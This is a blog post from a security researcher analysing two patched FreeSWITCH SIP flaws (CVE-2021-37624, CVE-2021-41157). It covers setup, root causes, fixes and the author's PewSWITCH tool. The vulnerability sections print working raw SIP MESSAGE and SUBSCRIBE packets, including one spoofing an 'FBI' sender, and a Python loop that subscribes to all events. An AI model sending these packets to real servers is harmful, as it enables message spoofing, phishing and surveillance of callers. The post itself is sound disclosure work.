<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under CWE-287.
Background The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under Sandro &ndash; where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn&rsquo;t much security enabled for a some SIP components in a default installation.
" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities-cve-2021-41157-cve-2021-37624/" />


    <title>
        
            Analyzing two FreeSWITCH vulnerabilities — CVE-2021-41157 &amp; CVE-2021-37624 :: 0xInfection&#39;s Blog — Ramblings of an Infected Geek 
        
    </title>





  <link rel="stylesheet" href="https://0xinfection.xyz/main.min.07ea7ac7da67e2e153a7dfa2457bc6a19cca824288d175e223fadc579041bc51.css" integrity="sha256-B&#43;p6x9pn4uFTp9&#43;iRXvGoZzKgkKI0XXiI/rcV5BBvFE=" crossorigin="anonymous">





    <link rel="apple-touch-icon" sizes="180x180" href="https://0xinfection.xyz/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://0xinfection.xyz/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://0xinfection.xyz/favicon-16x16.png">
    <link rel="manifest" href="https://0xinfection.xyz/site.webmanifest">
    <link rel="mask-icon" href="https://0xinfection.xyz/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://0xinfection.xyz/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Analyzing two FreeSWITCH vulnerabilities — CVE-2021-41157 & CVE-2021-37624">
  <meta itemprop="description" content="This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under CWE-287.
Background The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under Sandro – where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn’t much security enabled for a some SIP components in a default installation.">
  <meta itemprop="datePublished" content="2021-10-31T00:00:00+05:30">
  <meta itemprop="dateModified" content="2021-10-31T00:00:00+05:30">
  <meta itemprop="wordCount" content="1873">
  <meta itemprop="image" content="https://0xinfection.xyz/">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://0xinfection.xyz/">
  <meta name="twitter:title" content="Analyzing two FreeSWITCH vulnerabilities — CVE-2021-41157 & CVE-2021-37624">
  <meta name="twitter:description" content="This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under CWE-287.
Background The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under Sandro – where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn’t much security enabled for a some SIP components in a default installation.">



    <meta property="og:url" content="https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities-cve-2021-41157-cve-2021-37624/">
  <meta property="og:site_name" content="0xInfection&#39;s Blog — Ramblings of an Infected Geek">
  <meta property="og:title" content="Analyzing two FreeSWITCH vulnerabilities — CVE-2021-41157 & CVE-2021-37624">
  <meta property="og:description" content="This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under CWE-287.
Background The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under Sandro – where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn’t much security enabled for a some SIP components in a default installation.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-10-31T00:00:00+05:30">
    <meta property="article:modified_time" content="2021-10-31T00:00:00+05:30">
    <meta property="og:image" content="https://0xinfection.xyz/">






    <meta property="article:published_time" content="2021-10-31 00:00:00 &#43;0530 IST" />












    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://0xinfection.xyz/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">$</span>
            <span class="logo__text logo__pathname">
                ls /mnt/infected/</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#02d6f2;
                   animation-duration:1s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://0xinfection.xyz/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        9 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities-cve-2021-41157-cve-2021-37624/">Analyzing two FreeSWITCH vulnerabilities — CVE-2021-41157 &amp; CVE-2021-37624</a>
      </h1>

      

      
        <figure class="post-cover">
          <img src="https://0xinfection.xyz/images/covers/freeswitch-cover.gif" alt="Analyzing two FreeSWITCH vulnerabilities — CVE-2021-41157 &amp; CVE-2021-37624" />
          
          
        </figure>
      

      

      <div class="post-content">
        <p>This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under <a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a>.</p>
<h2 id="background">Background</h2>
<p>The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under <a href="https://twitter.com/sandrogauci">Sandro</a> &ndash; where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn&rsquo;t much security enabled for a some SIP components in a default installation.</p>
<p>In this post, I&rsquo;ll do a detailed walkthrough of the setup and the vulnerabilities. I also release a scanning and exploitation toolkit alongside this, so that anyone can reproduce and validate the bugs.</p>
<h2 id="the-setup">The Setup</h2>
<p>The initial setup of FreeSWITCH can be a bit tricky, hence I&rsquo;ll walk through the setup from scratch &ndash; so that the bugs are reproducible and can serve as a reference for any future wanderer in pursuit of knowledge. For our demo, I&rsquo;ll quickly get a base Debian VM up and running. The next set of steps are as below:</p>
<ul>
<li>
<p>To install the server, checkout the &ldquo;Building from Source&rdquo; section from <a href="https://freeswitch.org/confluence/display/FREESWITCH/Debian+10+Buster">here</a>. Make sure to pick a version less than v1.10.7. Once the server is installed, you might need some of the <a href="https://freeswitch.org/confluence/display/FREESWITCH/Debian+Post-Install+Tasks">post-installation instructions</a> to get it up and running.</p>
</li>
<li>
<p>After a clean install, you can confirm that FreeSWITCH status via the CLI interface using <code>fs_cli -rRS</code>.</p>
</li>
<li>
<p>Nexts its time to change the default passwords of the users for the installation now.</p>
<ul>
<li>First lets open <code>/usr/local/freeswitch/conf/vars.xml</code> in your favourite text editor.</li>
<li>Then, change the default password field by editing the value of data in the line:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;X-PRE-PROCESS</span> <span style="color:#a6e22e">cmd=</span><span style="color:#e6db74">&#34;set&#34;</span> <span style="color:#a6e22e">data=</span><span style="color:#e6db74">&#34;default_password=1234&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span></code></pre></div></li>
<li>Once the password has been changed, reload the FreeSWITCH service via the <code>reloadxml</code> command within the <code>fs_cli</code> shell.</li>
</ul>
</li>
<li>
<p>The default installation comes with 19 pre-configured users for testing purposes. You can create additional new users if you want. Just for the sake of simplicity we&rsquo;ll make use of the pre-built users in the system.</p>
<blockquote>
<p>NOTE: If you&rsquo;re creating new users, make sure to edit the dialplan configuration under <code>/usr/local/freeswitch/conf/dialplan/default.xml</code>.</p></blockquote>
</li>
<li>
<p>Once the users have been set up, we can now configure softphones to register with the server. For our example, we&rsquo;ll use the Zoiper softphone. Here&rsquo;s how to configure it:</p>
<ul>
<li>On the login page of Zoiper, we need to enter the username &ndash; which takes the form of <code>&lt;extension&gt;@&lt;ip&gt;</code>, where the extension can be any one of the prebuilt ones and the IP is the network address of the server.</li>
<li>For the password, let&rsquo;s enter the changed default password that we configured previously.</li>
</ul>
</li>
<li>
<p>The registration should succeed immediately, which can be confirmed via the <code>fs_cli</code> interface by typing <code>show registrations</code>.</p>
</li>
</ul>
<p>Nice, we now have a VoIP server up and running.</p>
<h2 id="the-vulnerabilities">The Vulnerabilities</h2>
<h3 id="1-missing-authentication-on-sip-message-packets-cve-2021-37624">1. Missing authentication on SIP MESSAGE packets (CVE-2021-37624)</h3>
<p>SIP MESSAGE, defined by <a href="https://datatracker.ietf.org/doc/html/rfc3428">RFC 3428</a>, provide a way to communicate between SIP user agents in form of messages. Messages are similar to short message service (SMS) mainly used for chat purposes between extensions (phone numbers). FreeSWITCH supports the SIP MESSAGE functionality as per the RFC.</p>
<p>IThe vulnerability lies in the default setup of a FreeSWITCH server where it didn&rsquo;t validate the authenticity/origin of SIP MESSAGE packets. This means that an unauthenticated attacker could send messages on behalf of someone else. Additionally, since no authentication is required, chat messages can be spoofed to appear to come from trusted contacts. Abuse of this bug can lead to issues like spam and enable other attacks like phishing, social engineering, etc. Imagine opening your phone in the morning and seeing this message just to hit a panic attack!</p>

    <img src="message.png"  alt="message"  class="center"  />


<p>To exploit the bug, anyone can simply send this packet to the vulnerable FreeSWITCH server, whose IP in my case is <code>192.168.0.107</code> with extension <code>1005</code>. The attacker machine IP is <code>192.168.0.105</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">MESSAGE</span> <span style="color:#960050;background-color:#1e0010">sip:</span><span style="color:#ae81ff">1005</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span> <span style="color:#960050;background-color:#1e0010">SIP/</span><span style="color:#ae81ff">2.0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Via:</span> <span style="color:#960050;background-color:#1e0010">SIP/</span><span style="color:#ae81ff">2.0</span><span style="color:#960050;background-color:#1e0010">/UDP</span> <span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.105</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">38626</span><span style="color:#960050;background-color:#1e0010">;rport;branch=z</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">hG</span><span style="color:#ae81ff">4</span><span style="color:#960050;background-color:#1e0010">bK-BpLnfgDs</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">From:</span> <span style="color:#e6db74">&#34;FBI&#34;</span> <span style="color:#960050;background-color:#1e0010">&lt;sip:</span><span style="color:#ae81ff">022-324-3000</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span><span style="color:#960050;background-color:#1e0010">&gt;;tag=c</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">WD</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">F</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">q</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">To:</span> <span style="color:#960050;background-color:#1e0010">&lt;sip:</span><span style="color:#ae81ff">1005</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span><span style="color:#960050;background-color:#1e0010">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">CSeq:</span> <span style="color:#ae81ff">1</span> <span style="color:#960050;background-color:#1e0010">MESSAGE</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">text/plain</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">User-Agent:</span> <span style="color:#960050;background-color:#1e0010">Infected</span> <span style="color:#960050;background-color:#1e0010">Phone</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Call-ID:</span> <span style="color:#960050;background-color:#1e0010">NfHK</span><span style="color:#ae81ff">5</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">84</span><span style="color:#960050;background-color:#1e0010">jjJkwzDkh</span><span style="color:#ae81ff">9</span><span style="color:#960050;background-color:#1e0010">h</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Contact:</span> <span style="color:#960050;background-color:#1e0010">&lt;sip:</span><span style="color:#ae81ff">022-324-3000</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">192.168</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#ae81ff">0.107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span><span style="color:#960050;background-color:#1e0010">;transport=udp&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Max-Forwards:</span> <span style="color:#ae81ff">70</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">25</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">FBI</span> <span style="color:#960050;background-color:#1e0010">here.</span> <span style="color:#960050;background-color:#1e0010">Open</span> <span style="color:#960050;background-color:#1e0010">your</span> <span style="color:#960050;background-color:#1e0010">door!</span>
</span></span></code></pre></div><p>Let&rsquo;s try to debug the root cause behind this. FreeSWITCH uses the Sofia library for providing SIP functionalities, and its configuration is located at <code>src/mod/endpoints/mod_sofia/conf/sofia.conf.xml</code>. Before commit <code>5c6fd51</code>, <a href="https://github.com/signalwire/freeswitch/blob/9376db0aae8422787ba9e688fd263814c16d9ed5/src/mod/endpoints/mod_sofia/conf/sofia.conf.xml#L320">L320</a> used to have a parameter named <code>auth-messages</code> (which was a flag to authenticate packets), with a default value set to <code>false</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- &lt;param name=&#34;auth-messages&#34; value=&#34;false&#34;/&gt; --&gt;</span>
</span></span></code></pre></div>
    <img src="bugmessage.png"  alt="message"  class="center"  />


<p>The team addressed the issue by removing <code>auth-messages</code> and introducing a new parameter <code>disable-auth-messages</code> with a higher priority. All versions greater than v1.10.6 now authenticates all messages by default.</p>

    <img src="msgfix.png"  alt="message"  class="center"  />


<p><strong>Reference:</strong></p>
<ul>
<li>Commit <a href="https://github.com/signalwire/freeswitch/commit/432bfc0c45de62cdf146ad3870f8b8d351c5c22b"><code>432bfc0</code></a></li>
</ul>
<h3 id="2-missing-authentication-on-sip-subscribe-packets-cve-2021-41157">2. Missing authentication on SIP SUBSCRIBE packets (CVE-2021-41157)</h3>
<p>SIP SUBSCRIBE, defined by <a href="https://datatracker.ietf.org/doc/html/rfc6665#section-3.1">RFC 6665</a>, provides a way to get the current state and status updates from a remote extension. The updates are sent via SIP NOTIFY messages to the requesting endpoint. The story above repeats itself in this case where FreeSWITCH again doesn&rsquo;t authenticate the endpoint requesting a subscription to events. Abuse of this vulnerability allows anyone to subscribe to event notifications without authenticating. This poses privacy concerns such as monitoring of the user activity, social engineering or similar attacks &ndash; essentially converting FreeSWITCH to a survelliance system!</p>
<p>To reproduce the vulnerability, one has to initiate a <code>dialog</code> SUBSCRIBE request to the extension on a vulnerable FreeSWITCH setup. My setup remains the same as above:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>SUBSCRIBE sip:<span style="color:#ae81ff">1005</span><span style="color:#f92672">@</span><span style="color:#ae81ff">192.168.0.107</span>;transport<span style="color:#f92672">=</span>UDP SIP<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0</span>
</span></span><span style="display:flex;"><span>Via: SIP<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0</span><span style="color:#f92672">/</span>UDP <span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">12701</span>;rport;branch<span style="color:#f92672">=</span>z9hG4bK<span style="color:#f92672">-</span>BpLnfgDsc2
</span></span><span style="display:flex;"><span>To: <span style="color:#f92672">&lt;</span>sip:<span style="color:#ae81ff">1005</span><span style="color:#f92672">@</span><span style="color:#ae81ff">192.168.0.107</span>:<span style="color:#ae81ff">5000</span>;transport<span style="color:#f92672">=</span>UDP<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>From: <span style="color:#f92672">&lt;</span>sip:<span style="color:#ae81ff">6969</span><span style="color:#f92672">@</span><span style="color:#ae81ff">1005</span>;transport<span style="color:#f92672">=</span>UDP<span style="color:#f92672">&gt;</span>;tag<span style="color:#f92672">=</span>WD8F2qNf
</span></span><span style="display:flex;"><span>Contact: <span style="color:#f92672">&lt;</span>sip:<span style="color:#ae81ff">1005</span><span style="color:#f92672">@</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">12701</span>;transport<span style="color:#f92672">=</span>UDP<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>Accept: <span style="color:#f92672">*/*</span>
</span></span><span style="display:flex;"><span>Max<span style="color:#f92672">-</span>Forwards: <span style="color:#ae81ff">70</span>
</span></span><span style="display:flex;"><span>Expires: <span style="color:#ae81ff">600</span>
</span></span><span style="display:flex;"><span>User<span style="color:#f92672">-</span>Agent: Infected Phone
</span></span><span style="display:flex;"><span>Call<span style="color:#f92672">-</span>ID: HK5a84jjJkwzDkh9h2fh
</span></span><span style="display:flex;"><span>CSeq: <span style="color:#ae81ff">1</span> SUBSCRIBE
</span></span><span style="display:flex;"><span>Event: dialog
</span></span><span style="display:flex;"><span>Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>FreeSWITCH will immediately respond with a <code>202 Accepted</code> response.</p>

    <img src="sub200.png"  alt="message"  class="center"  />


<p>Note that the <code>Allow-Events</code> header has multiple values, which means we can subscribe to those specified events and get updates about the user activity.</p>
<p>The next set of steps is obvious. We need to send SUBSCRIBE messages for all those events and wait for the server to <code>NOTIFY</code> us about them. A pseudocode representation in Python would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>all_events <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;talk&#34;</span>, <span style="color:#e6db74">&#34;conference&#34;</span>, <span style="color:#e6db74">&#34;as-feature-event&#34;</span>, <span style="color:#e6db74">&#34;hold&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;dialog&#34;</span>, <span style="color:#e6db74">&#34;line-seize&#34;</span>, <span style="color:#e6db74">&#34;call-info&#34;</span>, <span style="color:#e6db74">&#34;sla&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;include-session-description&#34;</span>, <span style="color:#e6db74">&#34;presence&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;presence.winfo&#34;</span>, <span style="color:#e6db74">&#34;message-summary&#34;</span>, <span style="color:#e6db74">&#34;refer&#34;</span>,
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> event <span style="color:#f92672">in</span> all_events:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># send the subscribe requests</span>
</span></span><span style="display:flex;"><span>    socket<span style="color:#f92672">.</span>send(
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;SUBSCRIBE sip:1005@192.168.0.107;transport=UDP SIP/2.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Via: SIP/2.0/UDP 192.168.0.105:52870;rport;branch=z9hG4bK-fUVuS9jZ8u
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Accept: */*
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    To: &lt;sip:1005@192.168.0.107:5060;transport=UDP&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    From: &lt;sip:6969@192.168.0.107:5060;transport=UDP&gt;;tag=VbhV3vC5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Contact: &lt;sip:1005@192.168.0.105:52870;transport=UDP&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Max-Forwards: 70
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Expires: 600
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    User-Agent: Infected Phone
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Call-ID: AWX39IVUWSP2NcHciWvq
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    CSeq: 1 SUBSCRIBE
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Event: </span><span style="color:#e6db74">{</span>event<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Content-Length: 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>)
</span></span></code></pre></div><p>Once, the packets have been sent, all we need to do is just sit back and listen for connections. For every SUBSCRIBE packet sent, a <code>202 Accepted</code> response should be immediately received with the <code>Subscription-State</code> header set to <code>active</code> &ndash; indicating that the subscription has been accepted.</p>

    <img src="notifyack.png"  alt="message"  class="center"  />


<p>Thereafter, as the user performs actions (e.g. deregister their softphone, take a phone call, etc), notifications would be sent back to our listener.</p>

    <img src="notifyping.png"  alt="message"  class="center"  />


<p>SIP NOTIFY bodies use XML (<a href="https://datatracker.ietf.org/doc/html/rfc3680">RFC 3680</a>). The below screenshot shows us an example of a NOTIFY body sent back to us indicating that the extension <code>1005</code> is <em>available</em> now.</p>

    <img src="notifybody.png"  alt="message"  class="center"  />


<p>To understand the root cause of this, lets dig into the source code. Prior to commit <code>0924fed</code> in file <a href="https://github.com/signalwire/freeswitch/blob/601960eb44556e2a5faeba2bf5ba3520ec4b2cbb/src/mod/endpoints/mod_sofia/conf/sofia.conf.xml#L320"><code>sofia.conf.xml</code></a> &ndash; there was a <code>auth-subscriptions</code> parameter whose default value was set to <code>false</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- &lt;param name=&#34;auth-subscriptions&#34; value=&#34;false&#34;/&gt; --&gt;</span>
</span></span></code></pre></div>
    <img src="subbug.png"  alt="message"  class="center"  />


<p>The developers fixed this vulnerability by deprecating <code>auth-subscriptions</code> and introducing a <code>disable-auth-subscriptions</code> parameter with a default value set to <code>false</code> in the Sofia config file. Additionally, the <code>auth-subscriptions</code> parameter has been turned to <code>true</code> for all default profiles in FreeSWITCH.</p>

    <img src="subfix.png"  alt="message"  class="center"  />


<p><strong>References:</strong></p>
<ul>
<li>Commit <a href="https://github.com/signalwire/freeswitch/commit/0924fed31da410760b50b4c3ddc08bded889e50c"><code>0924fed</code></a></li>
<li>Commit <a href="https://github.com/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e"><code>b21dd4e</code></a></li>
</ul>
<h2 id="fixes">Fixes</h2>
<p>The fixes for both the misconfigurations are out and upgrading to v1.10.7 will do the necessary. The same patches have been pulled into the official upstream package repositories in Debian and others, so updating via the package repositories will also do.</p>
<p>Let us quickly take a look at the status quo of the vulnerabilities. A quick <a href="https://www.shodan.io/search/report?query=freeswitch+-%221.10.7%22">Shodan search</a> reveals the number of possibly vulnerable FreeSWITCH servers out there on the internet. Below is a map showing the distribution of the vulnerable servers across the globe.</p>

    <img src="map.png"  alt="message"  class="center"  />


<p>Here&rsquo;s the facet analysis graph of the servers mapped to popular cloud providers:</p>

    <img src="facet.png"  alt="message"  class="center"  />


<h2 id="tool-release">Tool Release</h2>
<p>It is my personal opinion that it&rsquo;s the job of the researcher to release proof of concepts through which the vulnerability can be reproduced. Adhering to my principle, I&rsquo;m releasing a tool called <strong>PewSWITCH</strong> (I suck at names :D) to <em>pew pew pew</em> a vulnerableFreeSWITCH server. You can get the tool and detailed instructions on my <a href="https://github.com/0xInfection/PewSWITCH">GitHub</a>.</p>
<p>Let&rsquo;s quickly demo the tool against my setup. To run the tool, I&rsquo;ll quickly grab a binary from the <a href="https://github.com/0xInfection/PewSWITCH/releases">releases</a> section and fire it away:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ ./pewswitch-linux64 -exts <span style="color:#ae81ff">1005</span> <span style="color:#ae81ff">192.168</span>.0.107
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     ___    .        ____       _ __      __
</span></span><span style="display:flex;"><span>    / _ \___|\    __/ __/|   __(_) /_____/ /
</span></span><span style="display:flex;"><span>   / ___/ -_) |/|/ /\ \| |/|/ / / __/ __/ _ \
</span></span><span style="display:flex;"><span>  /_/   \__/|__,__/___/|__,__/_/\__/\__/_//_/  v0.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;where we pew pew pew freeswitch&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> No port supplied, using <span style="color:#66d9ef">default</span> port <span style="color:#ae81ff">5060</span> <span style="color:#66d9ef">for</span> targets...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Checking <span style="color:#66d9ef">if</span> hosts are alive and responding to SIP...
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2021</span>/<span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">05</span> <span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">59</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">16</span> Host <span style="color:#ae81ff">192.168</span>.0.<span style="color:#ae81ff">107</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5060</span> is up and responding to SIP.
